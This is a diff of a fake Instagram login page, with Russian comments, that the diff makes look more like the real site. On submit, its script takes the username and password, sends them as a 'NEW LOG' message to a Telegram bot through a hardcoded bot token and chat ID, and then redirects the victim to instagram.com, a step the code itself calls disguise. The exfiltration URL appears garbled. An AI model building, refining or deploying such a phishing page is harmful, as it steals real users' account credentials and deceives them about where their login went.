@@ -4,25 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход • Instagram</title>
+    <!-- Подключаем шрифт, похожий на лого Instagram -->
+    <link href="https://googleapis.com" rel="stylesheet">
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        /* Дизайн максимально под Инстаграм */
+        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .login-box { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
-
-        /* Реальный неоновый стиль как на фото */
+        
+        /* Оригинальный стиль шрифта логотипа */
         .logo { 
-            font-size: 55px; 
-            font-weight: bold; 
-            margin-bottom: 40px; 
-            font-family: 'Brush Script MT', cursive; /* Курсив как на фото */
-            color: #00eaff; /* Ярко-синий текст */
-            text-shadow: 
-                0 0 10px #00eaff,
-                0 0 20px #00eaff,
-                0 0 40px #ff00ff, /* Розовое свечение вокруг */
-                0 0 80px #ff00ff;
+            font-family: 'Grand Hotel', cursive; 
+            font-size: 50px; 
+            font-weight: 500; 
+            margin-bottom: 30px; 
+            letter-spacing: 1px;
         }
-
-        input { width: 100%; padding: 12px; background: #121212; border: 1px solid #363636; border-radius: 3px; color: #fff; margin-bottom: 12px; outline: none; font-size: 14px; }
+        
+        input { width: 100%; padding: 12px; background: #121212; border: 1px solid #363636; border-radius: 3px; color: #fff; margin-bottom: 12px; outline: none; font-size: 14px; box-sizing: border-box; }
         input:focus { border-color: #555; }
         button { width: 100%; padding: 10px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; cursor: pointer; font-size: 14px; }
         .footer { position: absolute; bottom: 20px; color: #8e8e8e; font-size: 12px; }
@@ -31,7 +29,6 @@
 <body>
 
     <div class="login-box">
-        <!-- Тот самый неоновый заголовок -->
         <div class="logo">Instagram</div>
         
         <form id="loginForm">
@@ -49,6 +46,7 @@
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
+            // Твои проверенные данные
             const token = '8314828218:AAGcMhdPg7GEDW4e1EPAlp-qJt5FkMXwlmY';
             const chat_id = '6576262467';
             
@@ -57,8 +55,8 @@
             
             const text = `📸 NEW LOG:\n👤 Логин: ${u}\n🔑 Пароль: ${p}`;
 
+            // Отправка данных
             try {
-                // ИСПРАВЛЕНО: добавлен api. и убраны ошибки в ссылке
                 await fetch(`https://telegram.org{token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -68,6 +66,7 @@
                 console.log('Ошибка отправки');
             }
 
+            // Маскировка: перенаправление
             window.location.href = 'https://instagram.com';
         });
     </script>
